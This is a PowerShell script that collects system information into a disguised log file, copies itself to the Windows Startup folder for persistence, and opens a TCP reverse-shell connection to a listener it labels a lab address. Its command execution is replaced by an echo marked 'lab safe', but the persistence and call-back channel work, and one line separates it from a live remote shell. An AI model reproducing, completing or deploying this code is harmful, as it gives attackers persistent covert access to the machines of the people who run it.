$logFile = "$env:APPDATA\SystemLog.txt"
$startupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\code.ps1"

try {
    $sysInfo = Get-ComputerInfo | Out-String
    Add-Content -Path $logFile -Value ("`n--- Log Entry: $(Get-Date) ---`n" + $sysInfo)
} catch {
    Add-Content -Path $logFile -Value ("Failed to log system info: $_")
}
try {
    if (-not (Test-Path $startupPath)) {
        Copy-Item -Path $MyInvocation.MyCommand.Path -Destination $startupPath -Force
        Add-Content -Path $logFile -Value "Copied to startup: $startupPath"
    }
} catch {
    Add-Content -Path $logFile -Value ("Failed to copy to startup: $_")
}

$serverIP = '192.168.1.18'  # YOUR LAB listener IP
$serverPort = 4443           # YOUR LAB listener port

try {
    $c = New-Object Net.Sockets.TCPClient($serverIP, $serverPort)
    $s = $c.GetStream()
    [byte[]]$b = 0..65535 | % {0}

    while (($i = $s.Read($b, 0, $b.Length)) -ne 0) {
        $d = ([Text.Encoding]::ASCII).GetString($b, 0, $i)
        
        # LAB SAFE: simulate command execution
        $r = "Executed safely in lab: $d"
        
        $r2 = $r + ' PS ' + (pwd).Path + '> '
        $s.Write(([Text.Encoding]::ASCII).GetBytes($r2), 0, $r2.Length)
        $s.Flush()
    }

    $c.Close()
} catch {
    Add-Content -Path $logFile -Value ("Connection to $serverIP:$serverPort failed: $_")
}
